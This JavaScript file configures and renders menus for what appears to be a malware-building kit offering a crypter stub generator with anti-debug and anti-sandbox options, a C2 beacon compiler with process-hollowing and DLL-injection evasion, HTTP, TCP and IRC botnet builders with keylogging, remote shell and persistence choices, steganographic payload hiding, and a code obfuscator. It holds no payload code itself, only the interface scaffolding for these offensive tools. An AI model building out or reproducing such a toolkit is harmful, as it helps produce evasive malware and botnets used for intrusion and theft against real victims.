// Engine Configuration System - Auto-generated menus
const engineConfigs = {
  'stub-generator': {
    name: 'Stub Generator',
    icon: '🏗️',
    enabled: true,
    category: 'Crypters',
    features: {
      stubTypes: ['cpp', 'csharp', 'python', 'powershell', 'java', 'go', 'rust', 'javascript', 'asm', 'advanced'],
      encryption: ['aes-256-gcm', 'aes-256-cbc', 'chacha20', 'hybrid', 'triple'],
      protections: ['antiDebug', 'antiVM', 'antiSandbox'],
      outputs: ['source', 'compiled']
    },
    menu: {
      payloadPath: { type: 'file', label: 'Payload File', required: true },
      stubType: { type: 'select', label: 'Stub Type', options: 'stubTypes' },
      encryptionMethod: { type: 'select', label: 'Encryption', options: 'encryption' },
      outputPath: { type: 'file', label: 'Output Path', mode: 'save' },
      protections: { type: 'checkboxes', label: 'Protections', options: 'protections' }
    }
  },

  'beaconism': {
    name: 'Beaconism Compiler',
    icon: '📡',
    enabled: false,
    category: 'C2 Framework',
    features: {
      protocols: ['https', 'http', 'dns', 'tcp', 'udp'],
      payloads: ['shellcode', 'dll', 'exe', 'powershell'],
      evasion: ['process-hollowing', 'dll-injection', 'reflective-loading'],
      encoding: ['base64', 'xor', 'rc4', 'aes']
    },
    menu: {
      c2Server: { type: 'text', label: 'C2 Server', placeholder: 'https://c2.example.com' },
      protocol: { type: 'select', label: 'Protocol', options: 'protocols' },
      payloadType: { type: 'select', label: 'Payload Type', options: 'payloads' },
      evasionTech: { type: 'select', label: 'Evasion', options: 'evasion' },
      encoding: { type: 'select', label: 'Encoding', options: 'encoding' },
      interval: { type: 'number', label: 'Beacon Interval (ms)', default: 5000 }
    }
  },

  'http-bot-generator': {
    name: 'HTTP Bot Builder',
    icon: '🌐',
    enabled: false,
    category: 'Botnets',
    features: {
      methods: ['GET', 'POST', 'PUT', 'DELETE'],
      formats: ['json', 'xml', 'form', 'raw'],
      auth: ['none', 'basic', 'bearer', 'api-key'],
      persistence: ['registry', 'startup', 'service', 'task']
    },
    menu: {
      endpoint: { type: 'text', label: 'C&C Endpoint', placeholder: 'http://localhost:8080/api' },
      method: { type: 'select', label: 'HTTP Method', options: 'methods' },
      format: { type: 'select', label: 'Data Format', options: 'formats' },
      auth: { type: 'select', label: 'Authentication', options: 'auth' },
      interval: { type: 'number', label: 'Check Interval (ms)', default: 5000 },
      persistence: { type: 'checkboxes', label: 'Persistence', options: 'persistence' }
    }
  },

  'tcp-bot-generator': {
    name: 'TCP Bot Builder',
    icon: '🔌',
    enabled: false,
    category: 'Botnets',
    features: {
      modes: ['client', 'server', 'reverse'],
      encryption: ['none', 'ssl', 'tls', 'custom'],
      commands: ['shell', 'file', 'keylog', 'screen'],
      persistence: ['registry', 'startup', 'service']
    },
    menu: {
      host: { type: 'text', label: 'Host', default: '127.0.0.1' },
      port: { type: 'number', label: 'Port', default: 4444 },
      mode: { type: 'select', label: 'Connection Mode', options: 'modes' },
      encryption: { type: 'select', label: 'Encryption', options: 'encryption' },
      commands: { type: 'checkboxes', label: 'Commands', options: 'commands' }
    }
  },

  'irc-bot-generator': {
    name: 'IRC Bot Builder',
    icon: '💬',
    enabled: false,
    category: 'Botnets',
    features: {
      servers: ['irc.freenode.net', 'irc.libera.chat', 'custom'],
      commands: ['join', 'part', 'msg', 'notice', 'kick', 'ban'],
      triggers: ['!', '@', '#', 'custom'],
      ssl: [true, false]
    },
    menu: {
      server: { type: 'text', label: 'IRC Server', default: 'irc.freenode.net' },
      port: { type: 'number', label: 'Port', default: 6667 },
      channel: { type: 'text', label: 'Channel', placeholder: '#botnet' },
      nickname: { type: 'text', label: 'Bot Nickname', placeholder: 'bot_' },
      trigger: { type: 'text', label: 'Command Trigger', default: '!' },
      ssl: { type: 'checkbox', label: 'Use SSL' }
    }
  },

  'malware-analysis': {
    name: 'Binary Analysis',
    icon: '🔍',
    enabled: false,
    category: 'Analysis',
    features: {
      scanTypes: ['static', 'dynamic', 'behavioral', 'heuristic'],
      formats: ['pe', 'elf', 'macho', 'raw'],
      techniques: ['disassembly', 'strings', 'imports', 'entropy', 'yara']
    },
    menu: {
      targetFile: { type: 'file', label: 'Target Binary', required: true },
      scanType: { type: 'select', label: 'Scan Type', options: 'scanTypes' },
      techniques: { type: 'checkboxes', label: 'Analysis Techniques', options: 'techniques' },
      outputReport: { type: 'file', label: 'Report Output', mode: 'save' }
    }
  },

  'network-tools': {
    name: 'Network Scanner',
    icon: '🌐',
    enabled: false,
    category: 'Reconnaissance',
    features: {
      scanTypes: ['port', 'host', 'service', 'vuln'],
      protocols: ['tcp', 'udp', 'icmp', 'arp'],
      techniques: ['syn', 'connect', 'stealth', 'fin']
    },
    menu: {
      target: { type: 'text', label: 'Target', placeholder: '192.168.1.0/24' },
      scanType: { type: 'select', label: 'Scan Type', options: 'scanTypes' },
      protocol: { type: 'select', label: 'Protocol', options: 'protocols' },
      technique: { type: 'select', label: 'Technique', options: 'techniques' },
      threads: { type: 'number', label: 'Threads', default: 10 }
    }
  },

  'stealth-engine': {
    name: 'Steganography',
    icon: '🖼️',
    enabled: false,
    category: 'Evasion',
    features: {
      carriers: ['image', 'audio', 'video', 'document'],
      methods: ['lsb', 'dct', 'dwt', 'spread-spectrum'],
      formats: ['png', 'jpg', 'wav', 'mp3', 'pdf']
    },
    menu: {
      carrierFile: { type: 'file', label: 'Carrier File', required: true },
      payloadFile: { type: 'file', label: 'Hidden Payload', required: true },
      method: { type: 'select', label: 'Steganography Method', options: 'methods' },
      outputFile: { type: 'file', label: 'Output File', mode: 'save' }
    }
  },

  'polymorphic-engine': {
    name: 'Code Obfuscator',
    icon: '🔒',
    enabled: false,
    category: 'Evasion',
    features: {
      languages: ['cpp', 'csharp', 'python', 'javascript', 'powershell'],
      techniques: ['variable-rename', 'control-flow', 'string-encrypt', 'junk-code'],
      levels: ['light', 'medium', 'heavy', 'extreme']
    },
    menu: {
      sourceFile: { type: 'file', label: 'Source Code', required: true },
      language: { type: 'select', label: 'Language', options: 'languages' },
      level: { type: 'select', label: 'Obfuscation Level', options: 'levels' },
      techniques: { type: 'checkboxes', label: 'Techniques', options: 'techniques' },
      outputFile: { type: 'file', label: 'Obfuscated Output', mode: 'save' }
    }
  }
};

// Auto-generate menu HTML for each engine
function generateEngineMenu(engineId) {
  const config = engineConfigs[engineId];
  if (!config) return '';

  let menuHTML = `
    <div class="engine-menu" id="${engineId}-menu" style="display: none;">
      <div class="engine-header">
        <h3>${config.icon} ${config.name}</h3>
        <span class="engine-category">${config.category}</span>
      </div>
      <div class="engine-controls">
  `;

  Object.entries(config.menu).forEach(([key, field]) => {
    menuHTML += generateFieldHTML(engineId, key, field, config.features);
  });

  menuHTML += `
      </div>
      <div class="engine-actions">
        <button class="btn-primary" onclick="executeEngine('${engineId}')">
          ${config.icon} Execute ${config.name}
        </button>
        <button class="btn-secondary" onclick="clearEngineConfig('${engineId}')">
          🧹 Clear
        </button>
      </div>
    </div>
  `;

  return menuHTML;
}

// Generate individual field HTML
function generateFieldHTML(engineId, fieldKey, field, features) {
  const fieldId = `${engineId}-${fieldKey}`;
  let html = `<div class="form-group">`;

  switch (field.type) {
    case 'text':
      html += `
        <label for="${fieldId}">${field.label}:</label>
        <input type="text" id="${fieldId}" placeholder="${field.placeholder || ''}" 
               value="${field.default || ''}" ${field.required ? 'required' : ''}>
      `;
      break;

    case 'number':
      html += `
        <label for="${fieldId}">${field.label}:</label>
        <input type="number" id="${fieldId}" value="${field.default || ''}" 
               ${field.required ? 'required' : ''}>
      `;
      break;

    case 'file':
      html += `
        <label for="${fieldId}">${field.label}:</label>
        <div class="file-input-group">
          <input type="text" id="${fieldId}" readonly ${field.required ? 'required' : ''}>
          <button type="button" onclick="browseFile('${fieldId}', '${field.mode || 'open'}')">
            📁 Browse
          </button>
        </div>
      `;
      break;

    case 'select':
      const options = features[field.options] || [];
      html += `
        <label for="${fieldId}">${field.label}:</label>
        <select id="${fieldId}" ${field.required ? 'required' : ''}>
          ${options.map(opt => `<option value="${opt}">${opt}</option>`).join('')}
        </select>
      `;
      break;

    case 'checkbox':
      html += `
        <label class="checkbox-label">
          <input type="checkbox" id="${fieldId}">
          ${field.label}
        </label>
      `;
      break;

    case 'checkboxes':
      const checkOptions = features[field.options] || [];
      html += `<label>${field.label}:</label><div class="checkbox-group">`;
      checkOptions.forEach(opt => {
        html += `
          <label class="checkbox-label">
            <input type="checkbox" id="${fieldId}-${opt}" value="${opt}">
            ${opt}
          </label>
        `;
      });
      html += `</div>`;
      break;
  }

  html += `</div>`;
  return html;
}

// Export for use in renderer
window.engineConfigs = engineConfigs;
window.generateEngineMenu = generateEngineMenu;